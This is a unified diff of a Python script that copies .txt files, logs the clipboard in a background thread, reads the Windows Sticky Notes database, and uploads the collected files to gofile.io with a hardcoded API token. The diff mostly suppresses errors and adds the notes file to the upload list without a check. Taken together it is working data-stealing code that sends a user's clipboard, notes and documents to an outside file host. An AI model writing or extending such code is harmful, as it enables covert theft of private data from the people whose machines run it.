@@ -1,4 +1,4 @@
-import os
+import os 
 import shutil
 import time
 import subprocess
@@ -16,10 +16,14 @@ for dirpath, dirnames, filenames in os.walk(root_directory):
         if filename.endswith(".txt"):
             source_file_path = os.path.join(dirpath, filename)
             destination_file_path = os.path.join(destination_directory, filename)
+            
             if not os.path.exists(destination_file_path) or (
                 os.path.getmtime(source_file_path) > os.path.getmtime(destination_file_path)
             ):
-                shutil.copy2(source_file_path, destination_file_path)
+                try:
+                    shutil.copy2(source_file_path, destination_file_path)
+                except Exception as e:
+                    pass
 
 def get_clipboard_content():
     try:
@@ -35,12 +39,12 @@ def log_clipboard_update(content, file_path):
 def upload_file(file_path, api_token):
     try:
         with open(file_path, "rb") as f:
-            requests.post(
+            response = requests.post(
                 "https://store9.gofile.io/uploadFile",
                 files={"file": f},
                 data={"token": api_token}
             )
-    except:
+    except Exception as e:
         pass
 
 def calculate_directory_size(directory_path):
@@ -55,6 +59,7 @@ def calculate_directory_size(directory_path):
 def upload_directory_if_changed(directory_path, api_token):
     if not hasattr(upload_directory_if_changed, 'last_size'):
         upload_directory_if_changed.last_size = 0
+
     current_size = calculate_directory_size(directory_path)
     if current_size != upload_directory_if_changed.last_size:
         upload_directory_if_changed.last_size = current_size
@@ -94,15 +99,13 @@ if __name__ == '__main__':
     
     sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
     if not os.path.isfile(sticky_notes_path):
-        sticky_notes_path = None
+        pass
 
     api_token = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"
     os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
     open(clipboard_log_path, 'a').close()
 
-    files_to_upload = [clipboard_log_path]
-    if sticky_notes_path:
-        files_to_upload.append(sticky_notes_path)
+    files_to_upload = [clipboard_log_path, sticky_notes_path]
     backup_folder_path = destination_directory
 
     threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,)).start()
